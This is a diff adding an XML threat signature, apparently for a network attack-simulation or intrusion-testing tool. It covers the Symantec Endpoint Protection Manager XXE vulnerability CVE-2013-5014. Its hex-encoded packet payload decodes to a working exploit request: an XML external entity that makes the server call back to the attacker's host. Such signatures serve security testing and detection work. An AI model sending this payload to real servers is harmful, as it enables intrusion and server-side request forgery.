@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Symantec Endpoint Protection Manager XML External Entity"/>
+    <EngDesc display="true" value="A XML external entity (XXE) vulnerability exists in Symantec Endpoint Protection Manager (SEPM). This is due to an incorrectly configured XML parser in the management console that readily processes XML external entities. A remote unauthenticated attacker may exploit this vulnerability via specially crafted HTTP requests containing XML to bypass security policies, perform server-side request forgery (SSRF) and cause a denial of service condition."/>
+    <Intent display="true">
+      <item value="DESIGN_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Symantec"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Endpoint_Protection_Manager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="11.0.x_prior_to_11.0.7"/>
+      <item value="12.1.x_prior_to_12.1.4"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140214-02"/>
+    <CVEID display="true" value="CVE-2013-5014"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="103305"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="cdfa9f39fdea06322ced0b1baa6f20c5"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635367998264421400"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1401183017" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:0F:42" destMac="00:50:56:B4:10:3A" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0192" Identification="0A82" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="C5D6" srcIP="172.16.8.106" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="42474" destPort="$HTTPdestPort" SeqNumber="3093A2C7" AckNumber="9060F13E" HeaderLength="08" WindowSize="00E5" Checksum="C6B7" UrgentPointer="0000" Options="0101080A013BA84701FDC78A" Payload="504F5354202F736572766C65742F436F6E736F6C65536572766C657420485454502F312E310D0A486F73743A203137322E31362E382E3133310D0A436F6E74656E742D4C656E6774683A203230380D0A436F6E74656E742D547970653A206D756C7469706172742F666F726D2D646174613B20626F756E646172793D54534C32303134303231342D30320D0A0D0A2D2D54534C32303134303231342D30320D0A436F6E74656E742D547970653A20746578742F786D6C0D0A436F6E74656E742D446973706F736974696F6E3A20706F630D0A0D0A3C21444F4354595045207365706D205B3C21454E54495459207061796C6F61642053595354454D2022687474703A2F2F3137322E31362E382E3130363A353633323822203E5D3E0D0A3C726571756573743E0D0A3C7878653E267061796C6F61643B3C2F7878653E0D0A3C2F726571756573743E0D0A2D2D54534C32303134303231342D30322D2D0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:10:3A" destMac="00:50:56:B4:0F:42" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="04E5" Identification="2A81" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="6284" srcIP="$destIP" destIP="172.16.8.106" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="42474" SeqNumber="9060F13E" AckNumber="3093A426" HeaderLength="08" WindowSize="0104" Checksum="9936" UrgentPointer="0000" Options="0101080A01FDC7F6013BA847" Payload="485454502F312E31203430302042616420526571756573740D0A5365742D436F6F6B69653A204A53455353494F4E49443D37463442353036384634363646373246423242363330344133394144353832353B20506174683D2F3B20487474704F6E6C790D0A436F6E74656E742D547970653A20746578742F68746D6C3B636861727365743D7574662D380D0A436F6E74656E742D4C656E6774683A203936380D0A446174653A205475652C2032352046656220323031342031393A31343A323020474D540D0A436F6E6E656374696F6E3A20636C6F73650D0A5365727665723A205345504D0D0A0D0A3C68746D6C3E3C686561643E3C7469746C653E41706163686520546F6D6361742F372E302E3333202D204572726F72207265706F72743C2F7469746C653E3C7374796C653E3C212D2D4831207B666F6E742D66616D696C793A5461686F6D612C417269616C2C73616E732D73657269663B636F6C6F723A77686974653B6261636B67726F756E642D636F6C6F723A233532354437363B666F6E742D73697A653A323270783B7D204832207B666F6E742D66616D696C793A5461686F6D612C417269616C2C73616E732D73657269663B636F6C6F723A77686974653B6261636B67726F756E642D636F6C6F723A233532354437363B666F6E742D73697A653A313670783B7D204833207B666F6E742D66616D696C793A5461686F6D612C417269616C2C73616E732D73657269663B636F6C6F723A77686974653B6261636B67726F756E642D636F6C6F723A233532354437363B666F6E742D73697A653A313470783B7D20424F4459207B666F6E742D66616D696C793A5461686F6D612C417269616C2C73616E732D73657269663B636F6C6F723A626C61636B3B6261636B67726F756E642D636F6C6F723A77686974653B7D2042207B666F6E742D66616D696C793A5461686F6D612C417269616C2C73616E732D73657269663B636F6C6F723A77686974653B6261636B67726F756E642D636F6C6F723A233532354437363B7D2050207B666F6E742D66616D696C793A5461686F6D612C417269616C2C73616E732D73657269663B6261636B67726F756E643A77686974653B636F6C6F723A626C61636B3B666F6E742D73697A653A313270783B7D41207B636F6C6F72203A20626C61636B3B7D412E6E616D65207B636F6C6F72203A20626C61636B3B7D4852207B636F6C6F72203A20233532354437363B7D2D2D3E3C2F7374796C653E203C2F686561643E3C626F64793E3C68313E485454502053746174757320343030202D203C2F68313E3C48522073697A653D223122206E6F73686164653D226E6F7368616465223E3C703E3C623E747970653C2F623E20537461747573207265706F72743C2F703E3C703E3C623E6D6573736167653C2F623E203C753E3C2F753E3C2F703E3C703E3C623E6465736372697074696F6E3C2F623E203C753E54686520726571756573742073656E742062792074686520636C69656E74207761732073796E746163746963616C6C7920696E636F72726563742E3C2F753E3C2F703E3C48522073697A653D223122206E6F73686164653D226E6F7368616465223E3C68333E41706163686520546F6D6361742F372E302E33333C2F68333E3C2F626F64793E3C2F68746D6C3E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
